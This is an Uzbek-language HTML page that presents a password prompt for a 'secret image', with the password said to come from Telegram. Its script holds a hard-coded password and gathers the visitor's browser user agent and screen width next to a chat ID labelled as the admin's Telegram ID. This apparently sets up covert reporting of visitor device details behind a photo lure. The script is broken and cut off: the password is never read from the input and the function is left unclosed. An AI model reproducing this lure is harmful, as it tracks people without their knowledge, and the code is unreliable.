<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <title>🔐 Maxfiy Rasm</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f0f0f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      padding: 20px;
      border-radius: 16px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      text-align: center;
      width: 90%;
      max-width: 400px;
    }

    input[type="password"] {
      padding: 10px;
      width: 80%;
      font-size: 16px;
      margin-bottom: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    button {
      padding: 10px 20px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
    }

    .hidden {
      display: none;
    }

    img {
      max-width: 100%;
      border-radius: 12px;
      margin-top: 10px;
    }

    .info {
      margin-top: 15px;
      font-size: 15px;
      text-align: left;
    }

    .info i {
      color: #555;
      margin-right: 8px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🔐 Parol kiriting</h2>
    <input type="password" id="password" placeholder="Telegarmdan olingan parol:">
    <br>
    <button onclick="checkPassword()">▶️ Kirish</button>

    <div id="secretContent" class="hidden">
      <h3>🖼️ Bu voqeani guvohlari qalban birgamiz:</h3>
      <img src="class.jpg" alt="Maxfiy Rasm">

    </div>
  </div>

  <script>
  async function checkPassword() {

    if (password === "1252") {

      const device = navigator.userAgent;
      const width = screen.width;

      const chatId = "7445142075";      // <- admin Telegram ID

</script>

</html>
